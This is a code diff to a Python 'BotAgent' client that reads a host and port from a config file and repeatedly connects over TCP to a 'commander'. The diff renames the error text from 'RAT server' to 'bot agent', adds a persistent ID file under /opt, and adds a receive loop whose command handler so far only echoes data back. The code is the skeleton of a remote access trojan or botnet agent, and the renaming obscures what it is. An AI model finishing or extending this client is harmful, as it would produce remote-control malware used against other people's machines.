@@ -14,7 +14,7 @@ def load_conf():
     cwd_path = Path(__file__)
     root_dir = cwd_path.parent.absolute()
     try:
-        config_path = os.path.join(root_dir, "cfg/client.ini")
+        config_path = os.path.join(root_dir, "cfg/bot-agent.ini")
         config_parser.read(config_path)
         host = config_parser.get("CORE", "HOST")
         port = int(config_parser.get("CORE", "PORT"))
@@ -24,7 +24,7 @@ def load_conf():
         idle_timeout = int(config_parser.get("CORE", "IDLE_TIMEOUT"))
         conn_buff = int((config_parser.get("CORE", "CONN_BUFF")))
     except Exception as err:
-        print("Error initializing CORE, RAT server not started because config file could not be loaded. Unexpected "
+        print("Error initializing CORE, bot agent not started because config file could not be loaded. Unexpected "
               "exception occurred: {}".format(err))
         exit(5)
     return host, port, max_reconn, conn_buff, idle_time, nidle_time, idle_timeout
@@ -42,14 +42,15 @@ class BotAgent:
         self.idle_tout = idle_timeout
         self.conn_buff = conn_buff
         self.sock = socket(AF_INET, SOCK_STREAM)
+        self.reconnect_count = 0
         self.__check_uuid()
         self.__run()
 
     def __check_uuid(self):
-        self.uid_path = os.path.join(os.getcwd(), ".bot-agent.id")
+        self.uid_path = os.path.join("/opt/bot-agent/", ".bot-agent.id")
         if os.path.isfile(self.uid_path):
             with open(self.uid_path, 'r') as fh:
-                self.uuid =  fh.read()
+                self.uuid = fh.read()
         else:
             self.uuid = self.__gen_uuid()
 
@@ -81,16 +82,23 @@ class BotAgent:
     def __run(self):
         while True:
             self.__tcp_handshake()
+            self.sock.setblocking(False)
             data = self.sock.recv(self.conn_buff)
-
+            # Waiting time for checking if commander is sending data
             if time.time() - self.last_online > self.idle_tout:
                 self.idle = True
             if self.idle:
                 time.sleep(self.idle_t)
             else:
                 time.sleep(self.nidle_t)
+            if data:
+                self.__process_command(data)
+            else:
+                self.sock.close()
+                self.sock = socket(AF_INET, SOCK_STREAM)
 
-    def __send_output(self):
+    def __process_command(self, data):
+        self.sock.sendall(data)
 
 
 if __name__ == "__main__":
